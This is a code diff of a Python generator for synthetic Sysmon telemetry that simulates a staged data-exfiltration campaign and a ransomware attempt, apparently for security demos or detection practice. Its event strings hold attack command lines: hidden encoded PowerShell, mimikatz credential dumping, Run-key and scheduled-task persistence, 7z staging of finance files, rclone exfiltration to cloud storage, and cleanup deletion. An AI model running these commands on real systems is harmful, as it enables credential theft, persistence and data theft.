-                                      "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
+                                      edge_image,
                                       "tcp", jessica_ip, random.randint(49152, 65535),
-                                      THREAT_IP, 443, demo_id=demo_id))
+                                      THREAT_IP, 443, demo_id=demo_id,
+                                      process_guid=edge_guid, process_id=edge_pid))
 
-        if hour == 10:
+            # PowerShell process (child of edge via phishing)
+            ps_image = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+            ps_pid = 15800
+            ps_guid = _generate_guid(seed=f"exfil:{jessica_computer}:ps:{day}")
+
             # 10:22 - PowerShell execution (post-credential theft)
             ts = date_add(base_date, day).replace(hour=10, minute=22, second=45)
             events.append(sysmon_eid1(ts, jessica_computer, jessica_user,
-                                      "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+                                      ps_image,
                                       "powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0AA==",
-                                      demo_id=demo_id))
+                                      demo_id=demo_id,
+                                      process_guid=ps_guid, process_id=ps_pid,
+                                      logon_guid=jessica_logon_guid))
 
             # 10:23 - File dropped: update.ps1
             ts = ts.replace(minute=23, second=5)
             events.append(sysmon_eid11(ts, jessica_computer, jessica_user,
-                                       "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-                                       "C:\\Users\\jbrown\\AppData\\Local\\Temp\\update.ps1",
-                                       demo_id=demo_id))
+                                       ps_image,
+                                       f"C:\\Users\\{EXFIL_LATERAL_WIN_USER}\\AppData\\Local\\Temp\\update.ps1",
+                                       demo_id=demo_id,
+                                       process_guid=ps_guid, process_id=ps_pid))
 
             # 10:23 - C2 callback
             ts = ts.replace(second=30)
             events.append(sysmon_eid3(ts, jessica_computer, jessica_user,
-                                      "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+                                      ps_image,
                                       "tcp", jessica_ip, random.randint(49152, 65535),
-                                      THREAT_IP, 443, demo_id=demo_id))
+                                      THREAT_IP, 443, demo_id=demo_id,
+                                      process_guid=ps_guid, process_id=ps_pid))
 
     # =========================================================================
     # Day 5-7: Lateral Movement
     # =========================================================================
     if day == 5 and hour == 11:
+        cmd_image = "C:\\Windows\\System32\\cmd.exe"
+        cmd_pid = 8400
+        cmd_guid = _generate_guid(seed=f"exfil:{jessica_computer}:cmd_recon:{day}")
+
         # Network reconnaissance
         ts = date_add(base_date, day).replace(hour=11, minute=15, second=10)
         events.append(sysmon_eid1(ts, jessica_computer, jessica_user,
-                                  "C:\\Windows\\System32\\cmd.exe",
+                                  cmd_image,
                                   "cmd.exe /c net view /domain",
-                                  demo_id=demo_id))
+                                  demo_id=demo_id,
+                                  process_guid=cmd_guid, process_id=cmd_pid,
+                                  logon_guid=jessica_logon_guid))
 
+        cmd2_pid = 8420
+        cmd2_guid = _generate_guid(seed=f"exfil:{jessica_computer}:cmd_recon2:{day}")
         ts = ts.replace(minute=16, second=5)
         events.append(sysmon_eid1(ts, jessica_computer, jessica_user,
-                                  "C:\\Windows\\System32\\cmd.exe",
+                                  cmd_image,
                                   "cmd.exe /c net group \"Domain Admins\" /domain",
-                                  demo_id=demo_id))
+                                  demo_id=demo_id,
+                                  process_guid=cmd2_guid, process_id=cmd2_pid,
+                                  logon_guid=jessica_logon_guid))
 
         # DNS lookup for DC
         ts = ts.replace(minute=17, second=22)
         events.append(sysmon_eid22(ts, jessica_computer, jessica_user,
-                                   "C:\\Windows\\System32\\cmd.exe",
+                                   cmd_image,
                                    "dc-bos-01.theFakeTshirtCompany.com",
                                    query_results="::ffff:10.10.20.10;",
-                                   demo_id=demo_id))
+                                   demo_id=demo_id,
+                                   process_guid=cmd2_guid, process_id=cmd2_pid))
 
     if day == 6 and hour == 14:
+        mimikatz_image = f"C:\\Users\\{EXFIL_LATERAL_WIN_USER}\\AppData\\Local\\Temp\\mimikatz.exe"
+        mimi_pid = 9200
+        mimi_guid = _generate_guid(seed=f"exfil:{jessica_computer}:mimikatz:{day}")
+        cmd_image = "C:\\Windows\\System32\\cmd.exe"
+        cmd_pid = 9100
+        cmd_guid = _generate_guid(seed=f"exfil:{jessica_computer}:cmd_lateral:{day}")
+
         # Credential dumping with mimikatz
         ts = date_add(base_date, day).replace(hour=14, minute=30, second=15)
         events.append(sysmon_eid1(ts, jessica_computer, jessica_user,
-                                  "C:\\Users\\jbrown\\AppData\\Local\\Temp\\mimikatz.exe",
+                                  mimikatz_image,
                                   "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit",
-                                  parent_image="C:\\Windows\\System32\\cmd.exe",
-                                  demo_id=demo_id))
+                                  parent_image=cmd_image,
+                                  demo_id=demo_id,
+                                  process_guid=mimi_guid, process_id=mimi_pid,
+                                  parent_process_guid=cmd_guid,
+                                  logon_guid=jessica_logon_guid))
 
         # WDigest credential caching enabled
         ts = ts.replace(minute=31, second=2)
         events.append(sysmon_eid13(ts, jessica_computer, jessica_user,
-                                   "C:\\Users\\jbrown\\AppData\\Local\\Temp\\mimikatz.exe",
+                                   mimikatz_image,
                                    "SetValue",
                                    "HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\\UseLogonCredential",
                                    "DWORD (0x00000001)",
-                                   demo_id=demo_id))
+                                   demo_id=demo_id,
+                                   process_guid=mimi_guid, process_id=mimi_pid))
 
         # SMB lateral to DC
         ts = ts.replace(minute=35, second=42)
         events.append(sysmon_eid3(ts, jessica_computer, jessica_user,
-                                  "C:\\Windows\\System32\\cmd.exe",
+                                  cmd_image,
                                   "tcp", jessica_ip, random.randint(49152, 65535),
-                                  "10.10.20.10", 445, demo_id=demo_id))
+                                  "10.10.20.10", 445, demo_id=demo_id,
+                                  process_guid=cmd_guid, process_id=cmd_pid))
 
         # SMB lateral to file server
         ts = ts.replace(minute=36, second=18)
         events.append(sysmon_eid3(ts, jessica_computer, jessica_user,
-                                  "C:\\Windows\\System32\\cmd.exe",
+                                  cmd_image,
                                   "tcp", jessica_ip, random.randint(49152, 65535),
-                                  "10.10.20.20", 445, demo_id=demo_id))
+                                  "10.10.20.20", 445, demo_id=demo_id,
+                                  process_guid=cmd_guid, process_id=cmd_pid))
 
     if day == 7 and hour == 9:
+        cmd_image = "C:\\Windows\\System32\\cmd.exe"
+        cmd_pid = 7600
+        cmd_guid = _generate_guid(seed=f"exfil:{alex_computer}:cmd_arrive:{day}")
+
         # Lateral movement arrives at alex.miller workstation (BOS)
         ts = date_add(base_date, day).replace(hour=9, minute=45, second=30)
         events.append(sysmon_eid1(ts, alex_computer, alex_user,
-                                  "C:\\Windows\\System32\\cmd.exe",
+                                  cmd_image,
                                   "cmd.exe /c whoami /all",
-                                  demo_id=demo_id))
+                                  demo_id=demo_id,
+                                  process_guid=cmd_guid, process_id=cmd_pid,
+                                  logon_guid=alex_logon_guid))
 
+        cmd2_pid = 7620
+        cmd2_guid = _generate_guid(seed=f"exfil:{alex_computer}:cmd_arrive2:{day}")
         ts = ts.replace(minute=46, second=15)
         events.append(sysmon_eid1(ts, alex_computer, alex_user,
-                                  "C:\\Windows\\System32\\cmd.exe",
+                                  cmd_image,
                                   "cmd.exe /c net use \\\\FILE-BOS-01\\finance$",
-                                  demo_id=demo_id))
+                                  demo_id=demo_id,
+                                  process_guid=cmd2_guid, process_id=cmd2_pid,
+                                  logon_guid=alex_logon_guid))
 
     # =========================================================================
     # Day 8-10: Persistence
     # =========================================================================
     if day == 8 and hour == 2:
+        reg_image = "C:\\Windows\\System32\\reg.exe"
+        reg_pid = 4200
+        reg_guid = _generate_guid(seed=f"exfil:{alex_computer}:reg:{day}")
+        ps_image = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+        ps_pid = 4300
+        ps_guid = _generate_guid(seed=f"exfil:{alex_computer}:ps_persist:{day}")
+
         # Registry persistence - Run key
         ts = date_add(base_date, day).replace(hour=2, minute=15, second=30)
         events.append(sysmon_eid13(ts, alex_computer, alex_user,
-                                   "C:\\Windows\\System32\\reg.exe",
+                                   reg_image,
                                    "SetValue",
                                    "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsHealthCheck",
                                    "C:\\ProgramData\\svchost.exe",
-                                   demo_id=demo_id))
+                                   demo_id=demo_id,
+                                   process_guid=reg_guid, process_id=reg_pid))
 
         # Backdoor dropped
         ts = ts.replace(minute=15, second=45)
         events.append(sysmon_eid11(ts, alex_computer, alex_user,
-                                   "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+                                   ps_image,
                                    "C:\\ProgramData\\svchost.exe",
-                                   demo_id=demo_id))
+                                   demo_id=demo_id,
+                                   process_guid=ps_guid, process_id=ps_pid))
 
         # Scheduled task for persistence
+        schtasks_pid = 4400
+        schtasks_guid = _generate_guid(seed=f"exfil:{alex_computer}:schtasks:{day}")
         ts = ts.replace(minute=16, second=10)
         events.append(sysmon_eid1(ts, alex_computer, alex_user,
                                   "C:\\Windows\\System32\\schtasks.exe",
                                   'schtasks /create /tn "WindowsHealthCheck" /tr "C:\\ProgramData\\svchost.exe" /sc onlogon /ru SYSTEM',
-                                  demo_id=demo_id))
+                                  demo_id=demo_id,
+                                  process_guid=schtasks_guid, process_id=schtasks_pid,
+                                  logon_guid=alex_logon_guid))
 
     if day == 9 and hour == 14:
+        sevenz_image = f"C:\\Users\\{EXFIL_TARGET_WIN_USER}\\AppData\\Local\\Temp\\7z.exe"
+        sevenz_pid = 5100
+        sevenz_guid = _generate_guid(seed=f"exfil:{alex_computer}:7z:{day}")
+        cmd_image = "C:\\Windows\\System32\\cmd.exe"
+        cmd_pid = 5000
+        cmd_guid = _generate_guid(seed=f"exfil:{alex_computer}:cmd_stage:{day}")
+
         # 7z compression for data staging
         ts = date_add(base_date, day).replace(hour=14, minute=10, second=5)
         events.append(sysmon_eid1(ts, alex_computer, alex_user,
-                                  "C:\\Users\\amiller\\AppData\\Local\\Temp\\7z.exe",
-                                  '7z.exe a -pS3cur3P@ss data_batch_1.zip "C:\\Users\\amiller\\Documents\\Finance\\*"',
-                                  parent_image="C:\\Windows\\System32\\cmd.exe",
-                                  demo_id=demo_id))
+                                  sevenz_image,
+                                  f'7z.exe a -pS3cur3P@ss data_batch_1.zip "C:\\Users\\{EXFIL_TARGET_WIN_USER}\\Documents\\Finance\\*"',
+                                  parent_image=cmd_image,
+                                  demo_id=demo_id,
+                                  process_guid=sevenz_guid, process_id=sevenz_pid,
+                                  parent_process_guid=cmd_guid,
+                                  logon_guid=alex_logon_guid))
 
         # Data staged to file server
         ts = ts.replace(minute=12, second=30)
         events.append(sysmon_eid3(ts, alex_computer, alex_user,
-                                  "C:\\Windows\\System32\\cmd.exe",
+                                  cmd_image,
                                   "tcp", alex_ip, random.randint(49152, 65535),
-                                  "10.10.20.20", 445, demo_id=demo_id))
+                                  "10.10.20.20", 445, demo_id=demo_id,
+                                  process_guid=cmd_guid, process_id=cmd_pid))
 
         # File created on staging area
         ts = ts.replace(minute=12, second=45)
         events.append(sysmon_eid11(ts, alex_computer, alex_user,
-                                   "C:\\Users\\amiller\\AppData\\Local\\Temp\\7z.exe",
-                                   "C:\\Users\\amiller\\AppData\\Local\\Temp\\data_batch_1.zip",
-                                   demo_id=demo_id))
+                                   sevenz_image,
+                                   f"C:\\Users\\{EXFIL_TARGET_WIN_USER}\\AppData\\Local\\Temp\\data_batch_1.zip",
+                                   demo_id=demo_id,
+                                   process_guid=sevenz_guid, process_id=sevenz_pid))
 
     if day == 10 and hour == 3:
+        sevenz_image = f"C:\\Users\\{EXFIL_TARGET_WIN_USER}\\AppData\\Local\\Temp\\7z.exe"
+        cmd_image = "C:\\Windows\\System32\\cmd.exe"
+        cmd_pid = 5200
+        cmd_guid = _generate_guid(seed=f"exfil:{alex_computer}:cmd_stage10:{day}")
+
         # More data staging batches
         for batch_num in range(2, 5):
+            sevenz_pid = 5300 + batch_num
+            sevenz_guid = _generate_guid(seed=f"exfil:{alex_computer}:7z_batch{batch_num}:{day}")
+
             ts = date_add(base_date, day).replace(hour=3, minute=10 + batch_num * 8, second=random.randint(0, 59))
             events.append(sysmon_eid1(ts, alex_computer, alex_user,
-                                      "C:\\Users\\amiller\\AppData\\Local\\Temp\\7z.exe",
-                                      f'7z.exe a -pS3cur3P@ss data_batch_{batch_num}.zip "C:\\Users\\amiller\\Documents\\Finance\\Q4_*"',
-                                      parent_image="C:\\Windows\\System32\\cmd.exe",
-                                      demo_id=demo_id))
+                                      sevenz_image,
+                                      f'7z.exe a -pS3cur3P@ss data_batch_{batch_num}.zip "C:\\Users\\{EXFIL_TARGET_WIN_USER}\\Documents\\Finance\\Q4_*"',
+                                      parent_image=cmd_image,
+                                      demo_id=demo_id,
+                                      process_guid=sevenz_guid, process_id=sevenz_pid,
+                                      parent_process_guid=cmd_guid,
+                                      logon_guid=alex_logon_guid))
 
             ts = ts.replace(second=random.randint(0, 59))
             events.append(sysmon_eid11(ts, alex_computer, alex_user,
-                                       "C:\\Users\\amiller\\AppData\\Local\\Temp\\7z.exe",
-                                       f"C:\\Users\\amiller\\AppData\\Local\\Temp\\data_batch_{batch_num}.zip",
-                                       demo_id=demo_id))
+                                       sevenz_image,
+                                       f"C:\\Users\\{EXFIL_TARGET_WIN_USER}\\AppData\\Local\\Temp\\data_batch_{batch_num}.zip",
+                                       demo_id=demo_id,
+                                       process_guid=sevenz_guid, process_id=sevenz_pid))
 
     # =========================================================================
     # Day 11-13: Exfiltration
     # =========================================================================
     if day == 11 and hour == 1:
+        rclone_image = f"C:\\Users\\{EXFIL_TARGET_WIN_USER}\\AppData\\Local\\Temp\\rclone.exe"
+        rclone_pid = 6100
+        rclone_guid = _generate_guid(seed=f"exfil:{alex_computer}:rclone:{day}")
+        cmd_image = "C:\\Windows\\System32\\cmd.exe"
+        cmd_pid = 6000
+        cmd_guid = _generate_guid(seed=f"exfil:{alex_computer}:cmd_exfil:{day}")
+
         # rclone for cloud exfil
         ts = date_add(base_date, day).replace(hour=1, minute=15, second=10)
         events.append(sysmon_eid1(ts, alex_computer, alex_user,
-                                  "C:\\Users\\amiller\\AppData\\Local\\Temp\\rclone.exe",
-                                  'rclone.exe copy "C:\\Users\\amiller\\AppData\\Local\\Temp\\data_batch_1.zip" gdrive:backup/finance/',
-                                  parent_image="C:\\Windows\\System32\\cmd.exe",
-                                  demo_id=demo_id))
+                                  rclone_image,
+                                  f'rclone.exe copy "C:\\Users\\{EXFIL_TARGET_WIN_USER}\\AppData\\Local\\Temp\\data_batch_1.zip" gdrive:backup/finance/',
+                                  parent_image=cmd_image,
+                                  demo_id=demo_id,
+                                  process_guid=rclone_guid, process_id=rclone_pid,
+                                  parent_process_guid=cmd_guid,
+                                  logon_guid=alex_logon_guid))
 
         # DNS to cloud storage
         ts = ts.replace(minute=15, second=25)
         events.append(sysmon_eid22(ts, alex_computer, alex_user,
-                                   "C:\\Users\\amiller\\AppData\\Local\\Temp\\rclone.exe",
+                                   rclone_image,
                                    "storage.googleapis.com",
                                    query_results="::ffff:35.186.224.25;",
-                                   demo_id=demo_id))
+                                   demo_id=demo_id,
+                                   process_guid=rclone_guid, process_id=rclone_pid))
 
         ts = ts.replace(minute=15, second=40)
         events.append(sysmon_eid22(ts, alex_computer, alex_user,
-                                   "C:\\Users\\amiller\\AppData\\Local\\Temp\\rclone.exe",
+                                   rclone_image,
                                    "s3.amazonaws.com",
                                    query_results="::ffff:54.239.28.85;",
-                                   demo_id=demo_id))
+                                   demo_id=demo_id,
+                                   process_guid=rclone_guid, process_id=rclone_pid))
 
         # Network to GCP
         ts = ts.replace(minute=16, second=5)
         events.append(sysmon_eid3(ts, alex_computer, alex_user,
-                                  "C:\\Users\\amiller\\AppData\\Local\\Temp\\rclone.exe",
+                                  rclone_image,
                                   "tcp", alex_ip, random.randint(49152, 65535),
-                                  "35.186.224.25", 443, demo_id=demo_id))
+                                  "35.186.224.25", 443, demo_id=demo_id,
+                                  process_guid=rclone_guid, process_id=rclone_pid))
 
         # Network to Azure (alternate exfil path)
         ts = ts.replace(minute=18, second=30)
         events.append(sysmon_eid3(ts, alex_computer, alex_user,
-                                  "C:\\Users\\amiller\\AppData\\Local\\Temp\\rclone.exe",
+                                  rclone_image,
                                   "tcp", alex_ip, random.randint(49152, 65535),
-                                  "52.239.228.100", 443, demo_id=demo_id))
+                                  "52.239.228.100", 443, demo_id=demo_id,
+                                  process_guid=rclone_guid, process_id=rclone_pid))
 
     if day == 12 and hour == 2:
+        rclone_image = f"C:\\Users\\{EXFIL_TARGET_WIN_USER}\\AppData\\Local\\Temp\\rclone.exe"
+        cmd_image = "C:\\Windows\\System32\\cmd.exe"
+        cmd_pid = 6200
+        cmd_guid = _generate_guid(seed=f"exfil:{alex_computer}:cmd_exfil12:{day}")
+
         # More exfil batches
         for batch_num in range(2, 4):
+            rclone_pid = 6300 + batch_num
+            rclone_guid = _generate_guid(seed=f"exfil:{alex_computer}:rclone_b{batch_num}:{day}")
+
             ts = date_add(base_date, day).replace(hour=2, minute=10 + batch_num * 12, second=random.randint(0, 59))
             events.append(sysmon_eid1(ts, alex_computer, alex_user,
-                                      "C:\\Users\\amiller\\AppData\\Local\\Temp\\rclone.exe",
-                                      f'rclone.exe copy "C:\\Users\\amiller\\AppData\\Local\\Temp\\data_batch_{batch_num}.zip" gdrive:backup/finance/',
-                                      parent_image="C:\\Windows\\System32\\cmd.exe",
-                                      demo_id=demo_id))
+                                      rclone_image,
+                                      f'rclone.exe copy "C:\\Users\\{EXFIL_TARGET_WIN_USER}\\AppData\\Local\\Temp\\data_batch_{batch_num}.zip" gdrive:backup/finance/',
+                                      parent_image=cmd_image,
+                                      demo_id=demo_id,
+                                      process_guid=rclone_guid, process_id=rclone_pid,
+                                      parent_process_guid=cmd_guid,
+                                      logon_guid=alex_logon_guid))
 
             ts = ts.replace(second=random.randint(0, 59))
             events.append(sysmon_eid3(ts, alex_computer, alex_user,
-                                      "C:\\Users\\amiller\\AppData\\Local\\Temp\\rclone.exe",
+                                      rclone_image,
                                       "tcp", alex_ip, random.randint(49152, 65535),
-                                      "35.186.224.25", 443, demo_id=demo_id))
+                                      "35.186.224.25", 443, demo_id=demo_id,
+                                      process_guid=rclone_guid, process_id=rclone_pid))
 
         # Finance CSV export
+        excel_pid = 6500
+        excel_guid = _generate_guid(seed=f"exfil:{alex_computer}:excel:{day}")
         ts = date_add(base_date, day).replace(hour=2, minute=50, second=15)
         events.append(sysmon_eid11(ts, alex_computer, alex_user,
                                    "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
-                                   "C:\\Users\\amiller\\Documents\\finance_export_final.csv",
-                                   demo_id=demo_id))
+                                   f"C:\\Users\\{EXFIL_TARGET_WIN_USER}\\Documents\\finance_export_final.csv",
+                                   demo_id=demo_id,
+                                   process_guid=excel_guid, process_id=excel_pid))
 
     if day == 13 and hour == 1:
+        rclone_image = f"C:\\Users\\{EXFIL_TARGET_WIN_USER}\\AppData\\Local\\Temp\\rclone.exe"
+        rclone_pid = 7100
+        rclone_guid = _generate_guid(seed=f"exfil:{alex_computer}:rclone_final:{day}")
+        cmd_image = "C:\\Windows\\System32\\cmd.exe"
+        cmd_pid = 7000
+        cmd_guid = _generate_guid(seed=f"exfil:{alex_computer}:cmd_final:{day}")
+
         # Final exfil batch
         ts = date_add(base_date, day).replace(hour=1, minute=30, second=22)
         events.append(sysmon_eid1(ts, alex_computer, alex_user,
-                                  "C:\\Users\\amiller\\AppData\\Local\\Temp\\rclone.exe",
-                                  'rclone.exe copy "C:\\Users\\amiller\\AppData\\Local\\Temp\\data_batch_4.zip" gdrive:backup/finance/',
-                                  parent_image="C:\\Windows\\System32\\cmd.exe",
-                                  demo_id=demo_id))
+                                  rclone_image,
+                                  f'rclone.exe copy "C:\\Users\\{EXFIL_TARGET_WIN_USER}\\AppData\\Local\\Temp\\data_batch_4.zip" gdrive:backup/finance/',
+                                  parent_image=cmd_image,
+                                  demo_id=demo_id,
+                                  process_guid=rclone_guid, process_id=rclone_pid,
+                                  parent_process_guid=cmd_guid,
+                                  logon_guid=alex_logon_guid))
 
         ts = ts.replace(minute=31, second=5)
         events.append(sysmon_eid3(ts, alex_computer, alex_user,
-                                  "C:\\Users\\amiller\\AppData\\Local\\Temp\\rclone.exe",
+                                  rclone_image,
                                   "tcp", alex_ip, random.randint(49152, 65535),
-                                  "35.186.224.25", 443, demo_id=demo_id))
+                                  "35.186.224.25", 443, demo_id=demo_id,
+                                  process_guid=rclone_guid, process_id=rclone_pid))
 
         # Cleanup attempt
+        cleanup_pid = 7200
+        cleanup_guid = _generate_guid(seed=f"exfil:{alex_computer}:cleanup:{day}")
         ts = ts.replace(minute=45, second=10)
         events.append(sysmon_eid1(ts, alex_computer, alex_user,
-                                  "C:\\Windows\\System32\\cmd.exe",
-                                  'cmd.exe /c del /q "C:\\Users\\amiller\\AppData\\Local\\Temp\\data_batch_*.zip"',
-                                  demo_id=demo_id))
+                                  cmd_image,
+                                  f'cmd.exe /c del /q "C:\\Users\\{EXFIL_TARGET_WIN_USER}\\AppData\\Local\\Temp\\data_batch_*.zip"',
+                                  demo_id=demo_id,
+                                  process_guid=cleanup_guid, process_id=cleanup_pid,
+                                  logon_guid=alex_logon_guid))
 
     return events
 
@@ -1656,8 +1927,17 @@ def generate_exfil_events(base_date: str, day: int, hour: int) -> List[str]:
 # SCENARIO: RANSOMWARE ATTEMPT (Day 7-8)
 # =============================================================================
 
+# Ransomware scenario Windows short username
+RANSOM_TARGET_WIN_USER = "bwhite"    # brooklyn.white's Windows short username
+
+
 def generate_ransomware_events(base_date: str, day: int, hour: int) -> List[str]:
-    """Generate ransomware attempt Sysmon events for a specific day/hour."""
+    """Generate ransomware attempt Sysmon events for a specific day/hour.
+
+    Day 7 (0-indexed): Attack chain — phishing, malware drop, C2, lateral, EDR detection.
+    Day 8 (0-indexed): Cleanup — Defender quarantine, IT admin remote session,
+                        registry cleanup, full AV scan.
+    """
     events = []
 
     # Ransomware config
@@ -1666,38 +1946,58 @@ def generate_ransomware_events(base_date: str, day: int, hour: int) -> List[str]
     target_user = f"{DOMAIN_PREFIX}\\brooklyn.white"
     c2_ip = "194.26.29.42"
     malware_name = "svchost_update.exe"
-    malware_path = "C:\\Users\\bwhite\\AppData\\Local\\Temp\\svchost_update.exe"
+    malware_path = f"C:\\Users\\{RANSOM_TARGET_WIN_USER}\\AppData\\Local\\Temp\\svchost_update.exe"
     phishing_attachment = "Invoice_Q4_2026.docm"
 
     demo_id = "ransomware_attempt"
 
-    # All events on Day 7 (start_day=7, 0-indexed)
-    if day != 7:
+    # Fix 4: Events on Day 7 (attack) AND Day 8 (cleanup)
+    if day not in (7, 8):
         return events
 
-    # 14:02 - Word opens malicious document
-    if hour == 14:
+    # Deterministic logon GUIDs
+    target_logon_guid = _generate_guid(seed=f"logon:{target_computer}:{target_user}:{day}")
+    system_logon_guid = _generate_guid(seed=f"logon:{target_computer}:{SYSTEM_USER}:{day}")
+
+    # =========================================================================
+    # Day 7: Attack chain
+    # =========================================================================
+    if day == 7 and hour == 14:
+        # Word process
+        word_image = "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"
+        word_pid = 11200
+        word_guid = _generate_guid(seed=f"ransom:{target_computer}:word:{day}")
+        word_cmd = f'"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" /n "C:\\Users\\{RANSOM_TARGET_WIN_USER}\\Downloads\\{phishing_attachment}"'
+
+        # 14:02 - Word opens malicious document
         ts = date_add(base_date, day).replace(hour=14, minute=2, second=10)
         events.append(sysmon_eid1(ts, target_computer, target_user,
-                                  "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
-                                  f'"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" /n "C:\\Users\\bwhite\\Downloads\\{phishing_attachment}"',
-                                  demo_id=demo_id))
+                                  word_image, word_cmd,
+                                  demo_id=demo_id,
+                                  process_guid=word_guid, process_id=word_pid,
+                                  logon_guid=target_logon_guid))
 
         # 14:02 - Malware dropped by macro
         ts = ts.replace(second=35)
         events.append(sysmon_eid11(ts, target_computer, target_user,
-                                   "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
-                                   malware_path,
-                                   demo_id=demo_id))
+                                   word_image, malware_path,
+                                   demo_id=demo_id,
+                                   process_guid=word_guid, process_id=word_pid))
+
+        # Malware process (child of Word)
+        malware_pid = 11400
+        malware_guid = _generate_guid(seed=f"ransom:{target_computer}:malware:{day}")
 
         # 14:03 - Malware executes (parent = WINWORD.EXE)
         ts = ts.replace(minute=3, second=5)
         events.append(sysmon_eid1(ts, target_computer, target_user,
-                                  malware_path,
-                                  malware_path,
-                                  parent_image="C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
-                                  parent_command_line=f'"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" /n "C:\\Users\\bwhite\\Downloads\\{phishing_attachment}"',
-                                  demo_id=demo_id))
+                                  malware_path, malware_path,
+                                  parent_image=word_image,
+                                  parent_command_line=word_cmd,
+                                  demo_id=demo_id,
+                                  process_guid=malware_guid, process_id=malware_pid,
+                                  parent_process_guid=word_guid,
+                                  logon_guid=target_logon_guid))
 
         # 14:03 - Registry persistence (Run key)
         ts = ts.replace(second=30)
@@ -1706,7 +2006,8 @@ def generate_ransomware_events(base_date: str, day: int, hour: int) -> List[str]
                                    "SetValue",
                                    "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate",
                                    malware_path,
-                                   demo_id=demo_id))
+                                   demo_id=demo_id,
+                                   process_guid=malware_guid, process_id=malware_pid))
 
         # 14:04 - DNS to C2 domain
         ts = ts.replace(minute=4, second=10)
@@ -1714,14 +2015,16 @@ def generate_ransomware_events(base_date: str, day: int, hour: int) -> List[str]
                                    malware_path,
                                    "update-check-service.ru",
                                    query_results=f"::ffff:{c2_ip};",
-                                   demo_id=demo_id))
+                                   demo_id=demo_id,
+                                   process_guid=malware_guid, process_id=malware_pid))
 
         # 14:05 - C2 callback
         ts = ts.replace(minute=5, second=2)
         events.append(sysmon_eid3(ts, target_computer, target_user,
                                   malware_path,
                                   "tcp", target_ip, random.randint(49152, 65535),
-                                  c2_ip, 443, demo_id=demo_id))
+                                  c2_ip, 443, demo_id=demo_id,
+                                  process_guid=malware_guid, process_id=malware_pid))
 
         # 14:08-10 - Lateral movement attempts (SMB)
         lateral_targets = ["10.30.30.21", "10.30.30.22", "10.30.30.40"]
@@ -1730,28 +2033,93 @@ def generate_ransomware_events(base_date: str, day: int, hour: int) -> List[str]
             events.append(sysmon_eid3(ts, target_computer, target_user,
                                       malware_path,
                                       "tcp", target_ip, random.randint(49152, 65535),
-                                      lateral_ip, 445, demo_id=demo_id))
+                                      lateral_ip, 445, demo_id=demo_id,
+                                      process_guid=malware_guid, process_id=malware_pid))
 
         # 14:11 - Ransom note dropped
         ts = ts.replace(minute=11, second=15)
         events.append(sysmon_eid11(ts, target_computer, target_user,
                                    malware_path,
-                                   "C:\\Users\\bwhite\\Desktop\\README_DECRYPT.txt",
-                                   demo_id=demo_id))
+                                   f"C:\\Users\\{RANSOM_TARGET_WIN_USER}\\Desktop\\README_DECRYPT.txt",
+                                   demo_id=demo_id,
+                                   process_guid=malware_guid, process_id=malware_pid))
+
+        # Defender process
+        defender_image = "C:\\Program Files\\Windows Defender\\MpCmdRun.exe"
+        defender_pid = 11600
+        defender_guid = _generate_guid(seed=f"ransom:{target_computer}:defender:{day}")
 
         # 14:12 - Windows Defender scan triggered
         ts = ts.replace(minute=12, second=5)
         events.append(sysmon_eid1(ts, target_computer, SYSTEM_USER,
-                                  "C:\\Program Files\\Windows Defender\\MpCmdRun.exe",
+                                  defender_image,
                                   '"C:\\Program Files\\Windows Defender\\MpCmdRun.exe" -Scan -ScanType 3',
-                                  demo_id=demo_id))
+                                  demo_id=demo_id,
+                                  process_guid=defender_guid, process_id=defender_pid,
+                                  logon_guid=system_logon_guid))
 
         # 14:12 - Defender network connection (telemetry)
         ts = ts.replace(second=30)
         events.append(sysmon_eid3(ts, target_computer, SYSTEM_USER,
-                                  "C:\\Program Files\\Windows Defender\\MpCmdRun.exe",
+                                  defender_image,
                                   "tcp", target_ip, random.randint(49152, 65535),
-                                  "13.107.42.14", 443, demo_id=demo_id))
+                                  "13.107.42.14", 443, demo_id=demo_id,
+                                  process_guid=defender_guid, process_id=defender_pid))
+
+    # =========================================================================
+    # Day 8: Cleanup/Containment (Fix 4)
+    # =========================================================================
+    if day == 8:
+        defender_image = "C:\\Program Files\\Windows Defender\\MpCmdRun.exe"
+
+        if hour == 8:
+            # 08:00 - Defender quarantine completes
+            quarantine_pid = 12100
+            quarantine_guid = _generate_guid(seed=f"ransom:{target_computer}:quarantine:{day}")
+            ts = date_add(base_date, day).replace(hour=8, minute=0, second=15)
+            events.append(sysmon_eid1(ts, target_computer, SYSTEM_USER,
+                                      defender_image,
+                                      '"C:\\Program Files\\Windows Defender\\MpCmdRun.exe" -RemediateThreats',
+                                      demo_id=demo_id,
+                                      process_guid=quarantine_guid, process_id=quarantine_pid,
+                                      logon_guid=system_logon_guid))
+
+            # 08:15 - IT admin remote session (mstsc.exe -> target:3389)
+            it_admin_user = f"{DOMAIN_PREFIX}\\svc_admin"
+            mstsc_image = "C:\\Windows\\System32\\mstsc.exe"
+            mstsc_pid = 12200
+            mstsc_guid = _generate_guid(seed=f"ransom:{target_computer}:mstsc:{day}")
